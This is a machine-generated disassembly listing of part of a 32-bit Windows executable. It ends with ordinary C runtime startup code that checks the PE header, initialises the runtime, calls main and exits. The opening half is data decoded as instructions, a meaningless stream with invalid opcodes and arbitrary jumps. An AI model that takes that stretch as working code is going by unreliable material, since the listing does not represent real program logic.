  422380:	mov    ecx,0xefb6f1a3
  422385:	xor    BYTE PTR [edi],ah
  422387:	pop    ecx
  422388:	inc    esi
  422389:	es ret 
  42238b:	stos   BYTE PTR es:[edi],al
  42238c:	xrelease xchg DWORD PTR [ebx+0x46feb9c1],ebp
  422393:	add    al,0x20
  422395:	xor    al,0x38
  422397:	sbb    al,0x82
  422399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42239a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42239b:	icebp  
  42239c:	sar    BYTE PTR [edx+0x2253f6e6],cl
  4223a2:	fwait
  4223a3:	mov    eax,0x174080e9
  4223a8:	ins    DWORD PTR es:[edi],dx
  4223a9:	dec    ebx
  4223aa:	push   cs
  4223ab:	xchg   esi,eax
  4223ac:	leave  
  4223ad:	inc    edi
  4223af:	pop    eax
  4223b0:	rcr    dh,cl
  4223b2:	xchg   esi,eax
  4223b3:	mov    ecx,0x12eeb955
  4223b8:	and    DWORD PTR [ebx+eax*4-0x33],edx
  4223bc:	jmp    0xa019df6a
  4223c1:	loope  0x42243e
  4223c3:	inc    esp
  4223c4:	hlt    
  4223c5:	out    dx,al
  4223c6:	popa   
  4223c7:	iret   
  4223c8:	adc    eax,0xcbfabe6d
  4223cd:	mov    bh,0xe3
  4223cf:	out    0x20,eax
  4223d1:	lock stc 
  4223d3:	jecxz  0x4223f8
  4223d5:	sbb    eax,0x59d0c4f0
  4223da:	(bad)  
  4223db:	cmp    ch,BYTE PTR [esi+0x62]
  4223de:	(bad)  
  4223df:	out    0x4b,al
  4223e1:	jne    0x4223f8
  4223e3:	push   cs
  4223e4:	retf   0x4312
  4223e7:	imul   esi,DWORD PTR [edi+0x32ea76e3],0xc9d850c4
  4223f1:	in     eax,dx
  4223f2:	cmp    dh,cl
  4223f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223f5:	in     eax,0x79
  4223f7:	icebp  
  4223f8:	sub    DWORD PTR [ecx+ebx*2-0x77],edx
  4223fc:	not    DWORD PTR [eax+eax*1]
  4223ff:	xor    DWORD PTR [ecx],eax
  422401:	les    ebp,FWORD PTR [ebx-0x2a1e7450]
  422407:	sub    DWORD PTR [eax],edx
  422409:	out    dx,al
  42240a:	xchg   edi,eax
  42240b:	mul    BYTE PTR [ebp-0x79]
  42240e:	mov    ch,0xfc
  422410:	mov    esp,0x7bb36f65
  422415:	inc    esi
  422416:	mov    bl,BYTE PTR [ebx]
  422418:	fs or  bh,dl
  42241b:	repz retf 0x7901
  42241f:	loope  0x4223a7
  422421:	add    dh,BYTE PTR ds:0x8e72ffe2
  422427:	sbb    eax,0xb3003edd
  42242c:	pop    ebx
  42242d:	and    bl,BYTE PTR [edi-0x500e5583]
  422433:	mov    al,0x8f
  422435:	mov    edi,0xbeb017ab
  42243a:	leave  
  42243b:	sub    BYTE PTR [edx-0x3fb89199],dl
  422441:	vmaxss xmm0,xmm6,DWORD PTR [ebp-0x41]
  422446:	ds hlt 
  422448:	mov    ah,0x73
  42244a:	xor    dh,dl
  42244c:	into   
  42244d:	lahf   
  42244e:	pusha  
  42244f:	lods   al,BYTE PTR ds:[esi]
  422450:	cmp    al,0x9b
  422452:	lahf   
  422453:	mov    BYTE PTR [ebx],dl
  422455:	push   edi
  422456:	jle    0x4223ec
  422458:	add    DWORD PTR [ebx+0x3c],ebp
  42245b:	inc    ebx
  42245c:	pop    edi
  42245d:	adc    eax,0xb59db47f
  422462:	adc    BYTE PTR [ebp-0x6c17c769],dh
  422468:	sbb    eax,0xd9b99bb1
  42246d:	fs add ebp,eax
  422470:	cmp    al,0x1e
  422472:	clc    
  422473:	sahf   
  422474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422475:	and    eax,esp
  422477:	xchg   DWORD PTR [ebx+0x41],edx
  42247a:	into   
  42247b:	outs   dx,DWORD PTR ds:[esi]
  42247c:	out    0x2a,al
  42247e:	inc    ebx
  42247f:	lea    eax,[esi]
  422481:	in     al,0xda
  422483:	int3   
  422484:	in     al,0x59
  422486:	gs loope 0x42241f
  422489:	pop    edi
  42248a:	fidiv  WORD PTR [eax-0x3ac48e2c]
  422490:	mov    al,ds:0x815ba2e2
  422495:	mov    ebx,0xb67d08c5
  42249a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42249b:	or     BYTE PTR [esi+0x361e4732],0xd3
  4224a2:	in     eax,0x68
  4224a4:	(bad)
  4224a8:	call   0x5f777185
  4224ad:	stos   BYTE PTR es:[edi],al
  4224ae:	xor    edx,edi
  4224b0:	xchg   ebx,eax
  4224b1:	and    dh,BYTE PTR [eax+ebp*2+0x1c]
  4224b5:	or     edi,edi
  4224b7:	out    0x6c,al
  4224b9:	sub    ebx,ebp
  4224bb:	jae    0x422505
  4224bd:	aad    0x13
  4224bf:	add    eax,0x2cfad5ba
  4224c4:	icebp  
  4224c5:	and    DWORD PTR [esi+0x23],esp
  4224c8:	hlt    
  4224c9:	mov    ch,0x23
  4224cb:	out    dx,eax
  4224cc:	dec    ecx
  4224cd:	push   esp
  4224ce:	out    0x51,eax
  4224d0:	push   0x4c
  4224d2:	fidivr DWORD PTR [bx+0x6d]
  4224d6:	inc    edx
  4224d7:	bound  ebx,QWORD PTR [ebx]
  4224d9:	cld    
  4224da:	xchg   esi,eax
  4224db:	out    dx,al
  4224dc:	mul    DWORD PTR [ebp+0x1b171433]
  4224e2:	sub    edx,ebp
  4224e4:	cmp    ch,BYTE PTR [edx+0x5a]
  4224e7:	outs   dx,BYTE PTR ds:[esi]
  4224e8:	(bad)  
  4224ea:	aas    
  4224eb:	or     BYTE PTR [esi+ebx*4],0x56
  4224ef:	in     eax,0x47
  4224f1:	dec    ecx
  4224f2:	pop    eax
  4224f3:	fisub  DWORD PTR [esi+0x44bf8b89]
  4224f9:	ret    0xc2b3
  4224fc:	fldenv [ebp-0x5dc48b67]
  422502:	mov    ebx,0xc5b191b5
  422507:	jne    0x4224b6
  422509:	fstp   DWORD PTR [ecx-0x69]
  42250c:	mov    ah,0x87
  42250e:	push   0xf683010c
  422513:	imul   esi,ecx,0xdfc02a34
  422519:	inc    esp
  42251a:	add    al,0x93
  42251c:	pop    es
  42251d:	add    DWORD PTR [edx+0x6c],edx
  422520:	cmp    al,0x22
  422522:	fisub  DWORD PTR ds:0xdd891c9c
  422528:	push   eax
  422529:	imul   edi,ebp,0xfffffffd
  42252c:	test   DWORD PTR [ebx],edi
  42252e:	dec    eax
  42252f:	cmp    dh,bh
  422531:	mov    edi,0xa4aa06d4
  422536:	cmp    al,0x53
  422538:	push   es
  422539:	adc    al,0x88
  42253b:	into   
  42253c:	scas   al,BYTE PTR es:[edi]
  42253d:	fist   WORD PTR [ebx+0x2a]
  422540:	add    DWORD PTR [esi-0x2312f0e4],edx
  422546:	adc    edi,DWORD PTR [edx+0x75]
  422549:	and    esp,DWORD PTR [ecx+edi*4]
  42254c:	adc    esi,DWORD PTR [ebx]
  42254e:	jo     0x42254d
  422550:	inc    BYTE PTR [edi]
  422552:	xor    DWORD PTR [edx-0x5f],edx
  422555:	popa   
  422556:	jmp    0x2c42561e
  42255b:	sub    esp,edx
  42255d:	xchg   edi,eax
  42255e:	mov    ebx,0xa04cae57
  422563:	jle    0x42251b
  422565:	push   0xdd0d983
  42256a:	push   eax
  42256b:	imul   edi,esp,0x52
  42256e:	mov    eax,ds:0x8a3a1857
  422573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422574:	inc    ebp
  422575:	test   esp,edi
  422577:	lds    ebx,FWORD PTR [ecx+edx*8-0x6f16f846]
  42257e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42257f:	lds    ebx,FWORD PTR [esi-0x52]
  422582:	or     eax,0xfbfae38b
  422587:	push   ecx
  422588:	lds    edx,FWORD PTR [ebx+0x17bc595a]
  42258e:	test   al,0x9c
  422590:	and    BYTE PTR [eax+0x2c5700ed],ch
  422596:	push   ebp
  422597:	and    al,0x98
  422599:	mov    edx,0x11424c48
  42259e:	mov    dl,BYTE PTR [edx+0x2f1c3a6e]
  4225a4:	mov    ecx,0x24932029
  4225a9:	or     al,BYTE PTR [ecx*4+0x3060dd18]
  4225b0:	lahf   
  4225b1:	imul   DWORD PTR [eax+0x65baf60a]
  4225b7:	ret    0xe829
  4225ba:	lock and eax,0x399f8a80
  4225c0:	(bad)  
  4225c1:	fisubr WORD PTR [ebx+0x57]
  4225c4:	mov    ecx,ds
  4225c6:	pushf  
  4225c7:	call   0x8022:0x97be72c6
  4225ce:	jae    0x422614
  4225d0:	daa    
  4225d1:	xchg   ebx,eax
  4225d2:	push   ds
  4225d3:	bound  esi,QWORD PTR [ebp-0x61]
  4225d6:	rol    al,1
  4225d8:	push   ebp
  4225d9:	xlat   BYTE PTR ds:[ebx]
  4225da:	stos   BYTE PTR es:[edi],al
  4225db:	arpl   WORD PTR [ebx+esi*1],bp
  4225de:	jecxz  0x42264e
  4225e0:	push   0xffffff92
  4225e2:	fs jb  0x422581
  4225e5:	mov    dl,BYTE PTR [edi]
  4225e7:	jne    0x42264a
  4225e9:	pop    ss
  4225ea:	test   al,0xfb
  4225ec:	xor    al,0xdd
  4225ee:	in     al,dx
  4225ef:	and    dh,bh
  4225f1:	stos   DWORD PTR es:[edi],eax
  4225f2:	push   ss
  4225f3:	fdivr  QWORD PTR es:[ecx]
  4225f6:	call   0x80847a92
  4225fb:	xor    eax,0x1d97f831
  422600:	and    edi,DWORD PTR [ecx-0x58]
  422603:	gs repnz sar ch,cl
  422607:	pop    esi
  422608:	jno    0x4225a5
  42260a:	cmova  edx,DWORD PTR ds:0xc1e3eafd
  422611:	and    bl,dh
  422613:	inc    eax
  422614:	out    0x79,al
  422616:	add    dh,BYTE PTR [edi]
  422618:	rol    DWORD PTR [esi],0xab
  42261b:	in     al,0x21
  42261d:	and    al,0x59
  42261f:	cli    
  422620:	xor    DWORD PTR [eax+0x52],eax
  422623:	icebp  
  422624:	(bad)  
  422625:	aaa    
  422626:	pop    esp
  422627:	into   
  422628:	xchg   edx,eax
  422629:	pop    ds
  42262a:	fidivr DWORD PTR [eax-0x19]
  42262d:	sbb    esp,esp
  42262f:	pushf  
  422630:	iret   
  422631:	dec    esp
  422632:	mov    esi,0x6f83203a
  422637:	add    edx,DWORD PTR [esi]
  422639:	dec    edi
  42263a:	les    ecx,FWORD PTR [ebp-0x17a336a9]
  422640:	or     al,0xef
  422642:	push   0xff3ad1d0
  422647:	or     ecx,DWORD PTR [ecx+0x78]
  42264a:	stos   DWORD PTR es:[edi],eax
  42264b:	test   eax,0x44983934
  422650:	pop    es
  422651:	(bad)  
  422652:	mul    DWORD PTR [ebx]
  422654:	push   edi
  422655:	cmc    
  422656:	sub    al,0x23
  422658:	outs   dx,BYTE PTR ds:[esi]
  422659:	add    dl,ch
  42265b:	sub    al,0xa
  42265d:	out    dx,al
  42265e:	push   eax
  42265f:	repz push ebp
  422661:	sbb    eax,0xdf07c2c6
  422666:	pop    esp
  422667:	mov    ds:0xca61791c,eax
  42266c:	ja     0x42266d
  42266e:	stos   BYTE PTR es:[edi],al
  42266f:	adc    bh,BYTE PTR [ecx]
  422671:	popf   
  422672:	enter  0xa696,0xab
  422676:	jle    0x4226ed
  422678:	dec    ebx
  422679:	ja     0x422625
  42267b:	arpl   dx,cx
  42267d:	adc    BYTE PTR [eax+0x33],dh
  422680:	test   eax,0xe51b0df3
  422685:	jle    0x422673
  422687:	mov    DWORD PTR [ebp-0xafc6790],esp
  42268d:	cdq    
  42268e:	popa   
  42268f:	push   ds
  422690:	rol    eax,1
  422692:	xchg   ebp,eax
  422693:	dec    edi
  422694:	mov    ecx,0x6580a2e
  422699:	cli    
  42269a:	jle    0x422672
  42269c:	aaa    
  42269d:	adc    al,0xa9
  42269f:	mov    ?,ebp
  4226a1:	or     al,0x28
  4226a3:	mov    ebp,0x80f6da0
  4226a8:	cmp    edx,DWORD PTR [edx]
  4226aa:	mov    ch,BYTE PTR [ecx]
  4226ac:	sar    BYTE PTR [ecx],1
  4226ae:	out    dx,eax
  4226af:	add    edx,ebx
  4226b1:	mov    cl,0x71
  4226b3:	xchg   BYTE PTR [eax+0x22e5d1a0],bh
  4226b9:	fsub   DWORD PTR [edi+0x5a]
  4226bc:	leave  
  4226bd:	push   esp
  4226be:	and    al,0xed
  4226c0:	gs jbe 0x4226b0
  4226c3:	adc    DWORD PTR ds:0xe7f8bcbf,ebx
  4226c9:	test   DWORD PTR [edx],0xeeb2d543
  4226cf:	xor    esp,edi
  4226d1:	mov    ds:0x4bc9a4fd,eax
  4226d6:	lods   eax,DWORD PTR ds:[esi]
  4226d7:	test   eax,0x3c449607
  4226dc:	xchg   ebx,eax
  4226dd:	loopne 0x4226bd
  4226df:	dec    ebx
  4226e0:	mov    ds:0x418c54a9,eax
  4226e6:	icebp  
  4226e7:	enter  0x55a8,0xcd
  4226eb:	les    ebp,FWORD PTR [esi+0x6eaaf3d9]
  4226f1:	xor    eax,0xa6f7a13a
  4226f6:	jo     0x4226f5
  4226f8:	fstp   st(5)
  4226fa:	adc    al,0xbf
  4226fc:	mov    eax,edi
  4226fe:	cwde   
  4226ff:	dec    ebp
  422700:	xchg   edx,eax
  422701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422702:	fcom   st(6)
  422704:	xor    BYTE PTR [edx+0x6d5571ad],al
  42270a:	or     eax,0x34a42899
  42270f:	xchg   ecx,eax
  422710:	int3   
  422711:	stos   DWORD PTR es:[edi],eax
  422712:	push   ss
  422713:	into   
  422714:	arpl   WORD PTR [ebx],bp
  422716:	mov    esp,DWORD PTR [ebp-0x16466727]
  42271c:	jne    0x422735
  42271e:	retf   0xacab
  422721:	sub    esp,esp
  422723:	fldcw  WORD PTR [ebp-0x6dbc16f6]
  422729:	int    0x47
  42272b:	test   BYTE PTR [eax],al
  42272d:	mov    eax,ds:0x6796119c
  422732:	loopne 0x42273c
  422734:	repnz mov al,ds:0xa2318a16
  42273a:	or     edx,DWORD PTR [edi]
  42273c:	or     cl,bl
  42273e:	jge    0x422735
  422740:	mov    dh,0xcc
  422742:	mov    edi,0xa504ae91
  422747:	sahf   
  422748:	imul   esi,DWORD PTR [esi+ebp*8+0x1d7e8f0f],0x4422f765
  422753:	(bad)  
  422754:	sbb    BYTE PTR [eax+ecx*8],bl
  422757:	sbb    al,0xc3
  422759:	adc    eax,0xcd73ca1a
  42275e:	pop    edi
  42275f:	aaa    
  422760:	les    esp,FWORD PTR [esi]
  422762:	cmc    
  422763:	mov    edx,0x99ebc416
  422768:	inc    esi
  422769:	call   0x2bc91281
  42276e:	pop    ebx
  42276f:	cs push ebp
  422771:	repz aaa 
  422773:	in     eax,0xd
  422775:	inc    edx
  422776:	in     al,dx
  422777:	pop    edx
  422778:	jg     0x42270b
  42277a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42277b:	adc    cl,0x69
  42277e:	xchg   ebp,eax
  42277f:	outs   dx,BYTE PTR ds:[esi]
  422780:	sub    eax,0x5b68a0e4
  422785:	xor    DWORD PTR [ebx],esi
  422787:	push   cs
  422788:	loopne 0x42277e
  42278a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42278b:	dec    esp
  42278c:	sub    eax,0xea102ccb
  422791:	dec    esp
  422792:	ret    0x4774
  422795:	mov    WORD PTR [eax],?
  422797:	add    BYTE PTR [edi],ah
  422799:	fdiv   DWORD PTR [ebp+0x2]
  42279c:	push   cs
  42279d:	xor    eax,0xcf4a5f32
  4227a2:	push   es
  4227a3:	arpl   si,bp
  4227a5:	enter  0xb42d,0xff
  4227a9:	sbb    eax,0x74ff990c
  4227ae:	push   es
  4227af:	pop    es
  4227b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227b1:	mov    ebp,0x6668fa4f
  4227b6:	cwde   
  4227b7:	sbb    al,0x42
  4227b9:	mov    edi,0xd8b646ca
  4227be:	or     cl,ah
  4227c0:	enter  0x7afa,0xd2
  4227c4:	xlat   BYTE PTR gs:[ebx]
  4227c6:	or     edx,ecx
  4227c8:	or     ebx,esp
  4227ca:	ret    
  4227cb:	pop    es
  4227cc:	add    BYTE PTR [eax+0x17],bl
  4227cf:	data16 ror BYTE PTR [esi],cl
  4227d2:	adc    ebp,esi
  4227d4:	jo     0x4227f6
  4227d6:	(bad)  
  4227d7:	gs dec edx
  4227d9:	dec    edx
  4227da:	add    DWORD PTR [ebp+0x5f],edi
  4227dd:	cmp    DWORD PTR [ebx-0x1b],esp
  4227e0:	in     eax,0x65
  4227e2:	sbb    DWORD PTR [edi],edi
  4227e4:	xor    eax,eax
  4227e6:	mov    esp,fs
  4227e8:	dec    edi
  4227e9:	push   es
  4227ea:	inc    edi
  4227eb:	mov    ah,0xab
  4227ed:	pusha  
  4227ee:	pop    esi
  4227ef:	add    esi,esi
  4227f1:	jl     0x42278f
  4227f3:	call   0x925d:0x108c3f81
  4227fa:	add    BYTE PTR [ebp+0x32],dl
  4227fd:	repz jo 0x4227ae
  422800:	adc    eax,0xe540c2e3
  422805:	call   0x1590:0x62ce2ff7
  42280c:	add    eax,0x8671a4f0
  422811:	xor    edx,edi
  422813:	push   ds
  422814:	fidiv  WORD PTR [eax+0x59]
  422817:	dec    edi
  422818:	pusha  
  422819:	dec    edi
  42281a:	loop   0x42280b
  42281c:	jnp    0x422835
  42281e:	sbb    DWORD PTR [eax+eax*8-0x3a],esp
  422822:	jp     0x4227b0
  422824:	sbb    al,0x1e
  422826:	push   es
  422827:	mov    al,0x39
  422829:	out    0xb5,al
  42282b:	mov    al,ds:0x82f7b768
  422830:	(bad)  
  422831:	jge    0x42280f
  422833:	mov    ebp,0x410bdaf7
  422838:	mov    bl,0xc4
  42283a:	xchg   ebx,eax
  42283b:	xchg   BYTE PTR [esi],al
  42283d:	sub    eax,ebp
  42283f:	fwait
  422840:	push   0x6e
  422842:	dec    edi
  422843:	mov    ds:0x92929906,al
  422848:	jb     0x42288c
  42284a:	push   eax
  42284b:	add    ebp,DWORD PTR [ecx+0x57]
  42284e:	jg     0x42288b
  422850:	loop   0x42281e
  422852:	pop    edi
  422853:	mov    esi,0xdcca5802
  422858:	rol    DWORD PTR [eax-0x4c26f77b],cl
  42285e:	mov    WORD PTR ds:[ebp-0x123c88f7],ss
  422865:	pop    ebx
  422866:	push   0xb86fdc00
  42286b:	add    DWORD PTR [esi+ebx*4+0x7],ecx
  42286f:	pop    ebp
  422870:	les    ebp,FWORD PTR [esi]
  422872:	pop    ss
  422873:	scas   al,BYTE PTR es:[edi]
  422874:	xchg   edi,eax
  422875:	mov    eax,0x277b1048
  42287a:	xor    eax,0x7bc6281
  42287f:	lahf   
  422880:	and    BYTE PTR [ebp+0x44],0xea
  422884:	push   edx
  422885:	sbb    ebp,DWORD PTR [eax+0x1f4062c5]
  42288b:	in     al,0x28
  42288d:	push   edx
  42288e:	les    edx,FWORD PTR [edi]
  422890:	js     0x422844
  422892:	inc    edi
  422893:	retf   
  422894:	ss shl esi,1
  422897:	int    0x43
  422899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42289a:	mov    ah,0xf5
  42289c:	std    
  42289d:	ds fs push ss
  4228a0:	mov    eax,ds:0x3d6b46d9
  4228a5:	jnp    0x4228e7
  4228a7:	add    DWORD PTR [edx+0x6e],0xffffffeb
  4228ab:	sahf   
  4228ac:	sub    DWORD PTR [ecx+0x32073854],ecx
  4228b2:	pop    ds
  4228b3:	jno    0x42290e
  4228b5:	dec    edi
  4228b6:	out    dx,al
  4228b7:	xrelease mov BYTE PTR [ebp-0x48],bh
  4228bb:	stc    
  4228bc:	or     BYTE PTR [eax+0x1a],cl
  4228bf:	stos   DWORD PTR es:[edi],eax
  4228c0:	daa    
  4228c1:	mov    ebx,0x8fd0eefd
  4228c6:	aad    0x71
  4228c8:	pop    ss
  4228c9:	xor    edx,DWORD PTR [ebp-0x45]
  4228cc:	daa    
  4228cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ce:	and    al,0x17
  4228d0:	add    DWORD PTR [esi+edx*1],ebp
  4228d3:	inc    ecx
  4228d4:	jle    0x4228bf
  4228d6:	cmp    BYTE PTR [eax],bh
  4228d8:	gs jecxz 0x4228fe
  4228db:	lock jne 0x422941
  4228de:	push   ebx
  4228df:	mov    edi,es
  4228e1:	push   edi
  4228e2:	call   0xa3e770c6
  4228e7:	in     eax,dx
  4228e8:	cmp    al,0xaa
  4228ea:	mov    cl,0x58
  4228ec:	xor    BYTE PTR [ecx-0x7e],cl
  4228ef:	mov    al,dl
  4228f1:	dec    esi
  4228f2:	dec    edx
  4228f3:	or     ah,ch
  4228f5:	mov    al,0xbb
  4228f7:	fisttp QWORD PTR [ebx+0x6f]
  4228fa:	push   ebx
  4228fb:	push   es
  4228fc:	(bad)  
  4228fd:	pop    ecx
  4228fe:	in     al,dx
  4228ff:	ins    BYTE PTR es:[edi],dx
  422900:	sbb    al,0x39
  422902:	jecxz  0x42294c
  422904:	mov    WORD PTR [esi-0x26],?
  422907:	fst    DWORD PTR [ecx-0x1a]
  42290a:	or     ch,BYTE PTR [eax+ebp*4+0x73]
  42290e:	int    0x13
  422910:	lahf   
  422911:	push   ebp
  422912:	jmp    0x9e567321
  422917:	mov    ah,dl
  422919:	sub    eax,0x569b8e62
  42291e:	sub    edi,ebp
  422920:	sbb    DWORD PTR [ecx],ecx
  422922:	jne    0x4228ed
  422924:	sbb    eax,0x4eb6539e
  422929:	jp     0x422968
  42292b:	daa    
  42292c:	jg     0x422937
  42292e:	shl    DWORD PTR [ebx],1
  422930:	out    0xf8,eax
  422932:	(bad)  
  422934:	in     eax,dx
  422935:	pop    ebp
  422936:	loope  0x422968
  422938:	sub    bl,BYTE PTR [eax+ebp*1-0xc]
  42293c:	aaa    
  42293d:	mov    edx,0xf4dcf8c0
  422942:	lea    edi,[ecx+0x30]
  422945:	mov    cl,0xb
  422947:	dec    esp
  422948:	popa   
  422949:	push   eax
  42294a:	cld    
  42294b:	popa   
  42294c:	mov    cl,0x18
  42294e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42294f:	xchg   esi,eax
  422950:	das    
  422951:	repz xor eax,0x30649bb4
  422957:	ja     0x422949
  422959:	push   0x33
  42295b:	rol    BYTE PTR [ebx+0x10c210c4],0x0
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
